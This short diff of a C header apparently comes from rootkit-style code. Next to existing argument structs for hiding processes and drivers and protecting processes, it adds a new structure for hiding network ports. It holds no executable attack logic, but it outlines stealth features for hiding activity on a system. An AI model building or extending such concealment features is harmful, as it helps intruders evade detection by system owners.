@@ -9,13 +9,15 @@ struct ProcessHidingSubargs {
     unsigned int pid;
 };
 
-
-
-
-
 struct DriverHidingSubargs {
     unsigned int rank;
 };
+
+struct PortHidingSubargs {
+    unsigned char transmission_type;
+    unsigned short port;
+};
+
 struct ProcessProtectingSubargs {
     unsigned int pid;
 };
